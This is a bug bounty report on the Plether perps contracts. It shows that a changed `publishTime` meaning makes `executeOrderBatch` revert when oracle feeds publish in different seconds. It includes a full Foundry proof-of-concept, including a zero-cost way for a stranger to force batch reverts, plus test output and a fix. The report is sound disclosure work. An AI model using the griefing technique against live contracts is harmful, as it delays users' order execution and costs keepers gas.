# \#99967 [SC-Medium] Batch order execution reverts when basket components have different publish times: #120 changed the meaning of `cache.publishTime` but left #103's reuse check on it

**Submitted on Nov 15th 2026 at 22:43:51 UTC by @v4rvl for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99967
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Summary

A keeper's `OrderRouter.executeOrderBatch` call reverts with `PletherOracle__StoredFeedBehind`, and none of its orders execute, including orders the call had already finalized. The keeper pays the gas of the failed call (2,316,519 gas for the five-order batch in the PoC). No funds move and no fill price changes: the victim's entry price is 100,000,000 in the equal-times batch and also in a single execution 40 seconds later. The orders wait until someone executes them with single `executeOrder` calls or bounded batches.

`OrderRouter.executeOrderBatch` lets a later FIFO order reuse the historical basket that an earlier order in the same call already parsed. Before reuse, the oracle checks that Pyth's stored price for every feed is at least `cache.publishTime`.

- That check was added in commit 64c6ea90 (#103). At that point `publishTime` was the **oldest** component time.
- Commit 81919218 (#120) redefined `publishTime` as the **newest** component time and added a separate `oldestPublishTime`. The reuse check was not updated.

So whenever the basket's components carry different publish times, the reuse check fails for the lagging feed. The router does not catch this error, so the whole batch reverts, including orders it had already finalized.

This needs no attacker and no unusual data. The payload is the natural one: the first tick after the commit for each feed, where one feed's first tick lands one second later than the other's.

Measured on the repository's `OrderRouterPythTestBase` fixture (two-feed basket), using only public entrypoints:
- **Equal component times:** a two-order batch executes both orders (3,683,938 gas), and a five-order batch executes all five.
- **Unequal component times:** for example A at t+2 and B at t+1, or A at t+1 and B at t+2.
  - The two-order batch reverts with `PletherOracle__StoredFeedBehind`.
  - The five-order batch also reverts (2,316,519 gas). Order 1's finalization is rolled back, and nothing changes.
- **The commits do not need to share a second.** Orders committed at t and t+5 with ticks A at t+7 and B at t+6 revert the same way.
- **Workarounds that execute both orders:** two single `executeOrder` calls with the same payload, or bounded batches.
- **Protective close:** a triggered stop-loss close followed by another account's order in the same second cannot be executed by that batch. It stays queued until someone executes it on its own.

## Vulnerability Detail

1. **The reuse check compares every feed against one aggregate time.** `packages/perps/src/PletherOracle.sol:262-266`:

```solidity
        if (!policy.oracleFrozen && _canReuseHistoricalBatchBasket(request.commitTime, cache)) {
            // Cache contents are caller-supplied; independently prove storage coverage, not price authenticity.
            for (uint256 i; i < pythFeedIds.length; ++i) {
                _requireStoredFeedCoverage(pythFeedIds[i], cache.publishTime);
            }
```

   `_requireStoredFeedCoverage` (`packages/perps/src/PletherOracle.sol:645-653`) reverts `PletherOracle__StoredFeedBehind` when `pyth.getPriceUnsafe(feed).publishTime < requiredPublishTime`.

2. **#120 redefined the operand.** `packages/perps/src/PletherOracle.sol:874-875`:

```solidity
        basket.publishTime = uint64(maxPublishTime);
        basket.oldestPublishTime = uint64(minPublishTime);
```

   Before 81919218 this line read `basket.publishTime = uint64(minPublishTime);`. The reuse check from 64c6ea90 was written against that minimum. It was correct then, because each feed's storage covers at least its own component, and every component is at least the minimum.

3. **Storage only covers each feed's own component.** For the first order, the oracle parses the payload, calls `pyth.updatePriceFeeds` with the same payload, and checks each feed against its own component time (`packages/perps/src/PletherOracle.sol:623-626`). After that, the lagging feed's stored time equals its own component time, which is below the newest component time that the reuse check demands.

4. **The router re-raises the error.** `packages/perps/src/OrderRouterExecutionSidecar.sol:1019-1027` catches only `PletherOracle__HistoricalParserFailure`. Any other oracle error is re-thrown:

```solidity
        } catch (bytes memory reason) {
            if (
                reason.length != 68
                    || _selector(reason) != IPletherOracle.PletherOracle__HistoricalParserFailure.selector
            ) {
                assembly ("memory-safe") {
                    revert(add(reason, 32), mload(reason))
                }
            }
```

   The router's own reuse decision (`packages/perps/src/OrderRouterExecutionSidecar.sol:1074-1091`) does not look at storage coverage. It therefore picks reuse, and the oracle then reverts.

5. **The regression test hides the case.** `test_BatchReusesBasketWhenEveryComponentFollowsBothCommits` (`packages/perps/test/perps/spec/oracle/OracleSynchronization.t.sol:434`) uses unequal component times. It passes only because it first writes newer prices for every feed into Pyth storage (`packages/perps/test/perps/spec/oracle/OracleSynchronization.t.sol:445-446`, `baseMockPyth.updatePriceFeeds{value: FEE}(newer)`).

   The protocol's own live paths (mark refresh, liquidation, LP settlement) no longer write Pyth storage since #120. They use `parsePriceFeedUpdates`. A mark refresh with a newer basket therefore leaves Pyth storage unchanged and cannot make the reuse check pass.

## Impact

Program impact row (Low): "Contract fails to deliver promised returns, but doesn't lose value."

Severity: Low. The fair control is the same orders, the same commits and the same keeper call with equal component times: that batch executes every order (`test_Control_EqualComponentTimes_BatchExecutesBoth`, and the equal arm of `test_FiveOrderBatch_RevertRollsBackPrefix`). The only change between the arms is that the two feeds' first post-commit ticks land in different seconds.

- **No funds move and no price changes.** A reverted batch changes no state. Orders keep their historical price, because the fill is the first tick after commit whenever it is executed. In the PoC, the victim's entry price is 100,000,000 both in the equal-times batch and in a single execution 40 seconds later.
- **The batch entrypoint fails for ordinary data.** Any batch in which a later order reuses an earlier order's basket reverts whenever the basket's components have different publish times. The revert also undoes the orders the batch had already finalized. The keeper pays the gas of the failed call (2,316,519 gas for five orders in the PoC).
- **Orders wait.** They execute only through single `executeOrder` calls (permissionless, and the order's owner can call it) or bounded batches, which cost more calls. This includes a protection-generated stop-loss close (`test_ProtectionCloseDelayedInBatch`). For a close in a moving market, the effect is a later time of execution, not a different fill price.
- **A stranger can force the reuse case at no cost.** The PoC's stranger commits a zero-bounty close with an explicit-fee bound of 0 right behind a victim's order. The stranger's own order then fails at execution with `ConstraintViolation`, and its balance change is 0. The stranger cannot choose the tick times. The revert needs unequal component times.

## Limits

- **Not a loss of funds.** Single execution and bounded batches work with the same payload. A keeper can also add a later tick for the lagging feed to the payload, so that the storage update covers the newest component. The attached PoC exercises the single-execution workaround only.
- **The two-feed fixture's `MockPyth` stands in for Pyth.** How often two real basket feeds publish their first post-commit tick in different seconds was not measured on live data. The effect applies to every such pair.
- **Liquidations are not affected.** `executeLiquidationBatch` and the other live paths do not use the cache. They parse a current basket (`packages/perps/src/PletherOracle.sol:749-801`).
- **The revert condition is listed in the documentation.** `packages/perps/ORACLE_SYNCHRONIZATION.md:109` and `packages/perps/SECURITY.md:676-678` describe batch-atomic reverts (see References). The report's point is that #120 made this condition fire for every natural payload with unequal component times, which the documentation does not say.

## References

- `packages/perps/ORACLE_SYNCHRONIZATION.md:61-63` (Batch reuse) says reuse "requires all components to follow that order's commit, fit its historical window and satisfy cache coverage. Otherwise the Router requests a new historical resolution." In the code, the router chooses reuse without checking coverage, and the oracle's coverage check reverts the call instead of falling back to a new resolution.
- `packages/perps/ORACLE_SYNCHRONIZATION.md:109` lists `StoredFeedBehind` and "failed cache coverage" as conditions that revert the transaction, including earlier batch progress. It does not say that a natural payload with unequal component times produces that condition.
- `packages/perps/SECURITY.md:676-678` says oracle/Pyth preparation failures are batch-atomic, and that keepers which need a durable progress boundary must bound `maxOrderId`. Bounding avoids the revert, but the batch entrypoint still fails for an unbounded natural payload.
- The earlier AI audit's MED-7 ("Keeper can settle traders and LPs on selectively updated basket components") led to #120. The response describes complete signed live baskets and accepted component ordering. It does not mention the batch reuse check.
- Commits: 64c6ea90 (#103) added the reuse coverage check. 81919218 (#120) redefined `publishTime` as the newest component time.

## Proof of Concept

## Proof of Concept

### Steps to reproduce

1. Refresh the mark through `OrderRouter.updateMarkPrice` and fund five traders.
2. Two traders commit opens with `OrderRouter.commitOrder` in the same second t (two blocks).
3. At t+3, call `executeOrderBatch(id2, payload)`, where the payload holds the first tick after t for each feed:
   - A at t+2 (previous tick before t)
   - B at t+1 (previous tick before t)
4. The call reverts with `PletherOracle__StoredFeedBehind(FEED_B, t+1, t+2)`. Both orders stay pending.
5. Controls:
   - the same orders with both ticks at t+1 execute in one batch
   - two single `executeOrder` calls with the unequal payload execute both
6. Variants:
   - commits five seconds apart
   - five orders in one second (the revert rolls back order 1)
   - a triggered stop-loss close followed by another account's order
   - a stranger's zero-bounty close placed behind a victim's order

### Proof of concept

Save the file below as `packages/perps/test/perps/BatchReuseCoverage.t.sol` and run, from `packages/perps`:

```
forge test --match-path test/perps/BatchReuseCoverage.t.sol -vv
```

The test uses the repository's `OrderRouterPythTestBase` fixture and its `MockPyth`, and only public entrypoints: `commitOrder`, `executeOrder`, `executeOrderBatch`, `updateMarkPrice`, `createPositionProtection`, `triggerPositionProtection` and `clearinghouse.deposit`. It uses no `vm.store`, `vm.etch` or `vm.mockCall`, and no owner calls.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

import {console2} from "forge-std/console2.sol";

import {OrderRouterPythTestBase} from "./shared/OrderRouterTestBase.sol";

/// Batch cache reuse checks every stored feed against the NEWEST component time.
/// #103 (64c6ea90) added `_requireStoredFeedCoverage(feed, cache.publishTime)` on reuse, when publishTime was the
/// oldest component. #120 (81919218) redefined publishTime as the newest component (PletherOracle.sol:874-875).
/// With unequal component publish times a reusing batch reverts with StoredFeedBehind, rolling back its prefix.
contract BatchReuseCoverageTest is OrderRouterPythTestBase {
    address internal keeper = address(0x4EE9);
    address internal traderA = address(0xA001);
    address internal traderB = address(0xA002);
    address internal traderC = address(0xA003);
    address internal traderD = address(0xA004);
    address internal traderE = address(0xA005);
    address internal stranger = address(0xBAD1);

    int64 internal constant PX = 100_000_000;
    uint256 internal now_;
    uint256 internal nonce = 1;

    // ------------------------------------------------------------------ helpers
    function _payload(uint256 timeA, uint256 timeB, uint256 prev, int64 price) internal pure returns (bytes[] memory d) {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate(FEED_A, MockPyth.MockPrice(price, 0, int32(-8), timeA, prev));
        u[1] = MockPyth.FeedUpdate(FEED_B, MockPyth.MockPrice(price, 0, int32(-8), timeB, prev));
        d = new bytes[](1);
        d[0] = abi.encode(u);
    }

    function _advance(uint256 t) internal {
        now_ = t;
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _refreshMark(int64 price) internal {
        _advance(now_ + 2);
        vm.prank(keeper);
        router.updateMarkPrice(_payload(now_ - 1, now_ - 1, now_ - 2, price));
    }

    function _fund(address who, uint256 amount) internal {
        settlementToken.mint(who, amount);
        vm.startPrank(who);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(who, amount);
        vm.stopPrank();
    }

    function _request(CfdTypes.Side side, uint256 lots, uint256 margin, bool isClose)
        internal
        returns (OrderV3Types.OrderRequest memory request)
    {
        uint256 w = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(keccak256(abi.encode("BRC", nonce++)))) >> 8,
            side: side,
            sizeDelta: lots * CfdTypes.SIZE_QUANTUM,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(w),
                executionWindowSeconds: uint32(w),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _commit(address who, OrderV3Types.OrderRequest memory request) internal returns (uint64 id) {
        vm.prank(who);
        id = router.commitOrder(request);
        // Next commit in a new block, same second.
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _size(address who) internal view returns (uint256 lots) {
        (uint256 size,,,,,,) = engine.positions(who);
        lots = size / CfdTypes.SIZE_QUANTUM;
    }

    function _stateDigest() internal view returns (bytes32 h) {
        address[7] memory a = [traderA, traderB, traderC, traderD, traderE, stranger, keeper];
        for (uint256 i; i < a.length; ++i) {
            (uint256 size, uint256 margin,,,,,) = engine.positions(a[i]);
            h = keccak256(abi.encode(h, size, margin, clearinghouse.balanceAssets(a[i])));
        }
        h = keccak256(
            abi.encode(h, router.nextExecuteId(), engine.lastMarkPrice(), engine.lastMarkTime(), pool.totalAssets())
        );
    }

    function _storedFeedBehind(bytes32 feed, uint256 stored, uint256 required) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(IPletherOracle.PletherOracle__StoredFeedBehind.selector, feed, stored, required);
    }

    function _setUpMarket() internal {
        now_ = block.timestamp + 10 hours;
        vm.warp(now_);
        _refreshMark(PX);
        _fund(traderA, 100_000e6);
        _fund(traderB, 100_000e6);
        _fund(traderC, 100_000e6);
        _fund(traderD, 100_000e6);
        _fund(traderE, 100_000e6);
        _fund(stranger, 10_000e6);
        _refreshMark(PX);
    }

    /// Two opens committed in the same second t. Execution at t+3.
    function _twoOrdersSameSecond() internal returns (uint64 id1, uint64 id2, uint256 t) {
        t = now_;
        id1 = _commit(traderA, _request(CfdTypes.Side.LONG, 100, 4_000e6, false));
        id2 = _commit(traderB, _request(CfdTypes.Side.SHORT, 100, 4_000e6, false));
        _advance(t + 3);
    }

    // ------------------------------------------------------------------ tests
    /// Control: both components published at t+1. The second order reuses the cached basket; both execute.
    function test_Control_EqualComponentTimes_BatchExecutesBoth() public {
        _setUpMarket();
        (, uint64 id2, uint256 t) = _twoOrdersSameSecond();
        uint256 g = gasleft();
        vm.prank(keeper);
        OrderV3Types.BatchResult memory r = router.executeOrderBatch(id2, _payload(t + 1, t + 1, t - 1, PX));
        console2.log("control: terminal", r.terminalCount, "gas", g - gasleft());
        assertEq(r.terminalCount, 2);
        assertEq(router.nextExecuteId(), 0);
        assertEq(_size(traderA), 100);
        assertEq(_size(traderB), 100);
    }

    /// Same orders, natural first-after-commit ticks with different seconds: A at t+2, B at t+1.
    /// Order 1 parses and syncs storage (A=t+2, B=t+1); order 2 reuses the cache and requires stored B >= t+2.
    function test_UnequalComponentTimes_BatchReverts() public {
        _setUpMarket();
        (,, uint256 t) = _twoOrdersSameSecond();
        uint64 id2 = router.nextCommitId() - 1;
        bytes32 before = _stateDigest();
        vm.prank(keeper);
        vm.expectRevert(_storedFeedBehind(FEED_B, t + 1, t + 2));
        router.executeOrderBatch(id2, _payload(t + 2, t + 1, t - 1, PX));
        assertEq(_stateDigest(), before, "nothing changed");
        assertEq(router.nextExecuteId(), id2 - 1, "both orders still pending");
        console2.log("unequal A@t+2 B@t+1: batch reverts StoredFeedBehind(FEED_B, t+1, t+2)");

        // The mirrored layout reverts on the other feed.
        vm.prank(keeper);
        vm.expectRevert(_storedFeedBehind(FEED_A, t + 1, t + 2));
        router.executeOrderBatch(id2, _payload(t + 1, t + 2, t - 1, PX));
        console2.log("unequal A@t+1 B@t+2: batch reverts StoredFeedBehind(FEED_A, t+1, t+2)");
    }

    /// The commits need not share a second: t and t+5, ticks A at t+7 and B at t+6 (no tick in between).
    function test_UnequalComponentTimes_CommitsFiveSecondsApart() public {
        _setUpMarket();
        uint256 t = now_;
        _commit(traderA, _request(CfdTypes.Side.LONG, 100, 4_000e6, false));
        _advance(t + 5);
        uint64 id2 = _commit(traderB, _request(CfdTypes.Side.SHORT, 100, 4_000e6, false));
        _advance(t + 8);
        vm.prank(keeper);
        vm.expectRevert(_storedFeedBehind(FEED_B, t + 6, t + 7));
        router.executeOrderBatch(id2, _payload(t + 7, t + 6, t - 1, PX));
        console2.log("commits t and t+5, A@t+7 B@t+6: batch reverts");

        vm.prank(keeper);
        OrderV3Types.BatchResult memory r = router.executeOrderBatch(id2, _payload(t + 6, t + 6, t - 1, PX));
        assertEq(r.terminalCount, 2);
        console2.log("same commits, A@t+6 B@t+6: batch executes both");
    }

    /// The same unequal payload executes both orders through single executeOrder calls (no cache).
    function test_SingleExecutionSucceeds() public {
        _setUpMarket();
        (uint64 id1, uint64 id2, uint256 t) = _twoOrdersSameSecond();
        bytes[] memory p = _payload(t + 2, t + 1, t - 1, PX);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r1 = router.executeOrder(id1, p);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r2 = router.executeOrder(id2, p);
        assertEq(uint256(r1.status), uint256(OrderV3Types.LifecycleStatus.Executed));
        assertEq(uint256(r2.status), uint256(OrderV3Types.LifecycleStatus.Executed));
        console2.log("single executeOrder x2 with the unequal payload: both Executed");
    }

    /// Five orders in one second: the reuse at order 2 reverts the whole call, including order 1's finalization.
    function test_FiveOrderBatch_RevertRollsBackPrefix() public {
        _setUpMarket();
        uint256 t = now_;
        address[5] memory a = [traderA, traderB, traderC, traderD, traderE];
        uint64 last;
        for (uint256 i; i < 5; ++i) {
            last = _commit(a[i], _request(i % 2 == 0 ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT, 100, 4_000e6, false));
        }
        _advance(t + 3);
        uint256 snap = vm.snapshotState();

        bytes32 before = _stateDigest();
        uint256 g = gasleft();
        vm.prank(keeper);
        try router.executeOrderBatch(last, _payload(t + 2, t + 1, t - 1, PX)) {
            revert("expected revert");
        } catch (bytes memory err) {
            assertEq(err, _storedFeedBehind(FEED_B, t + 1, t + 2));
        }
        console2.log("5 orders, unequal: reverted, gas", g - gasleft());
        assertEq(_stateDigest(), before, "order 1 finalization rolled back");
        assertEq(_size(traderA), 0);

        vm.revertToState(snap);
        g = gasleft();
        vm.prank(keeper);
        OrderV3Types.BatchResult memory r = router.executeOrderBatch(last, _payload(t + 1, t + 1, t - 1, PX));
        console2.log("5 orders, equal: terminal", r.terminalCount, "gas", g - gasleft());
        assertEq(r.terminalCount, 5);
    }

    /// A triggered stop-loss close followed by another account's order in the same second: the protective close
    /// cannot run in a batch with the natural payload; it stays queued until a single or bounded execution.
    function test_ProtectionCloseDelayedInBatch() public {
        _setUpMarket();
        vm.prank(keeper);
        router.executeOrder(
            _commitAndAdvance(traderC, _request(CfdTypes.Side.LONG, 1_000, 20_000e6, false)),
            _payload(now_ - 1, now_ - 1, now_ - 3, PX)
        );
        _refreshMark(PX);
        PositionProtectionTypes.PositionProtectionParams memory pp;
        pp.takeProfitTriggerPrice = uint256(uint64(PX)) * 9_900 / 10_000;
        pp.stopLossTriggerPrice = uint256(uint64(PX)) * 10_100 / 10_000;
        pp.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        IPositionProtectionActions book = IPositionProtectionActions(address(router.positionProtectionBook()));
        vm.prank(traderC);
        uint64 pid = book.createPositionProtection(pp);
        _advance(now_ + 1);
        int64 crossed = int64(uint64(uint256(uint64(PX)) * 10_120 / 10_000));
        uint256 t = now_;
        vm.prank(keeper);
        uint64 closeId = book.triggerPositionProtection(pid, _payload(t, t, t - 1, crossed));
        vm.roll(vm.getBlockNumber() + 1);
        uint64 follower = _commit(traderA, _request(CfdTypes.Side.SHORT, 100, 4_000e6, false));
        _advance(t + 3);

        vm.prank(keeper);
        vm.expectRevert(_storedFeedBehind(FEED_B, t + 1, t + 2));
        router.executeOrderBatch(follower, _payload(t + 2, t + 1, t - 1, crossed));
        assertEq(_size(traderC), 1_000, "stop-loss close still queued");
        console2.log("stop-loss close id", closeId, "batch with follower reverts; position lots", _size(traderC));

        vm.prank(keeper);
        router.executeOrder(closeId, _payload(t + 2, t + 1, t - 1, crossed));
        assertEq(_size(traderC), 0);
        console2.log("single executeOrder of the stop-loss close: position lots", _size(traderC));
    }

    /// A stranger's zero-bounty close (explicit-fee bound 0, fails at execution) placed right behind a victim's
    /// order makes the batch revert. The stranger pays nothing; the victim self-executes at the same price.
    function test_StrangerZeroCostLever() public {
        _setUpMarket();
        vm.prank(keeper);
        router.executeOrder(
            _commitAndAdvance(stranger, _request(CfdTypes.Side.SHORT, 20, 2_000e6, false)),
            _payload(now_ - 1, now_ - 1, now_ - 3, PX)
        );
        _refreshMark(PX);
        uint256 t = now_;
        uint64 victim = _commit(traderA, _request(CfdTypes.Side.LONG, 100, 4_000e6, false));
        OrderV3Types.OrderRequest memory rq = _request(CfdTypes.Side.SHORT, 10, 0, true);
        rq.bounds.maxExplicitFeesAssets = 0;
        uint256 strangerBefore = clearinghouse.balanceAssets(stranger);
        uint64 lever = _commit(stranger, rq);
        assertEq(router.lifecycleBook().pendingIntent(lever).executionBountyAssets, 0, "close: zero bounty");
        _advance(t + 3);
        bytes[] memory p = _payload(t + 2, t + 1, t - 1, PX);

        uint256 snap = vm.snapshotState();
        vm.prank(keeper);
        OrderV3Types.BatchResult memory ctl = router.executeOrderBatch(lever, _payload(t + 1, t + 1, t - 1, PX));
        (,, uint256 entryControl,,,,) = engine.positions(traderA);
        console2.log("control (equal times) terminal", ctl.terminalCount, "victim entry", entryControl);
        vm.revertToState(snap);

        vm.prank(keeper);
        vm.expectRevert(_storedFeedBehind(FEED_B, t + 1, t + 2));
        router.executeOrderBatch(lever, p);

        _advance(t + 40);
        vm.prank(traderA);
        router.executeOrder(victim, p);
        (,, uint256 entryLate,,,,) = engine.positions(traderA);
        assertEq(entryLate, entryControl, "same historical tick, same entry");
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(lever, p);
        console2.log("victim self-executes at t+40, entry", entryLate);
        console2.log("stranger order status/reason", uint256(r.status), uint256(r.terminalReason));
        console2.log("stranger balance change", int256(clearinghouse.balanceAssets(stranger)) - int256(strangerBefore));
    }

    function _commitAndAdvance(address who, OrderV3Types.OrderRequest memory rq) internal returns (uint64 id) {
        id = _commit(who, rq);
        _advance(now_ + 2);
    }
}
```

### Output

Forge output of the command above (`poc-output.txt`):

```
$ forge test --match-path test/perps/BatchReuseCoverage.t.sol -vv

Ran 7 tests for test/perps/BatchReuseCoverage.t.sol:BatchReuseCoverageTest
[PASS] test_Control_EqualComponentTimes_BatchExecutesBoth() (gas: 7894443)
Logs:
  control: terminal 2 gas 3683938

[PASS] test_FiveOrderBatch_RevertRollsBackPrefix() (gas: 18053821)
Logs:
  5 orders, unequal: reverted, gas 2316519
  5 orders, equal: terminal 5 gas 7331518

[PASS] test_ProtectionCloseDelayedInBatch() (gas: 11172224)
Logs:
  stop-loss close id 2 batch with follower reverts; position lots 1000
  single executeOrder of the stop-loss close: position lots 0

[PASS] test_SingleExecutionSucceeds() (gas: 8168908)
Logs:
  single executeOrder x2 with the unequal payload: both Executed

[PASS] test_StrangerZeroCostLever() (gas: 14609544)
Logs:
  control (equal times) terminal 2 victim entry 100000000
  victim self-executes at t+40, entry 100000000
  stranger order status/reason 3 8
  stranger balance change 0

[PASS] test_UnequalComponentTimes_BatchReverts() (gas: 9562341)
Logs:
  unequal A@t+2 B@t+1: batch reverts StoredFeedBehind(FEED_B, t+1, t+2)
  unequal A@t+1 B@t+2: batch reverts StoredFeedBehind(FEED_A, t+1, t+2)

[PASS] test_UnequalComponentTimes_CommitsFiveSecondsApart() (gas: 10160677)
Logs:
  commits t and t+5, A@t+7 B@t+6: batch reverts
  same commits, A@t+6 B@t+6: batch executes both

Suite result: ok. 7 passed; 0 failed; 0 skipped; finished in 24.00ms (81.47ms CPU time)

Ran 1 test suite in 24.40ms (24.00ms CPU time): 7 tests passed, 0 failed, 0 skipped (7 total tests)
```

## Recommendation

Restore the operand that #103 was written for. In `packages/perps/src/PletherOracle.sol:265`:

```solidity
-                _requireStoredFeedCoverage(pythFeedIds[i], cache.publishTime);
+                _requireStoredFeedCoverage(pythFeedIds[i], cache.oldestPublishTime);
```

For an exact per-feed check, the cache can carry each component's publish time instead. Either change keeps the coverage guarantee and makes a reusing batch execute with the natural payload.

